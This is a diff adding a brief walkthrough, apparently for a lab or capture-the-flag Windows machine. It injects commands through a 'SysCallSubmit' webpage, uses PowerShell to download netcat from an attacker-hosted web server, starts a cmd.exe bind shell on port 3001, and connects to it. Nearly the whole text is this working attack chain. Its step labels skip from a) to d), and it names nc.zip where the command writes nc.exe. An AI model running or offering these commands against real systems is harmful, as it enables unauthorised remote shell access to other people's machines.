@@ -1,0 +1,19 @@
+1. Get a copy of NetCat for windows and host it on a webserver - 
+    'https://joncraton.org/blog/46/netcat-for-windows/'
+    (10.10.10.2:8000/nc.exe will be used as an example)
+        python -m SimpleHTTPServer in directory holding nc.exe
+
+2. From the SysCallSubmit webpage we will need to submit a series of commands
+   that:
+   (SysCall submit will send commands to CMD. use 
+   'powershell -command "POWERSHELLCOMMANDHERE"' to execute powershell commands)
+   a) Download nc from webserver (nc.zip is the downloaded file)
+        powershell -command "Invoke-WebRequest -UseBasicParsing 
+        -OutFile C:\Users\uncle\nc.exe http://10.10.10.2:8000/nc.exe"
+   d) Launch shell (this command launches a shell specifically on 3001)
+        powershell -command "C:\Users\uncle\nc.exe -Lp 3001 -e cmd.exe"
+
+3. On attack machine, establish tcp connection with corresponding port
+        nc 10.10.10.1 3001
+
+YOU NOW HAVE UNPRIVILEGED ACCESS :)
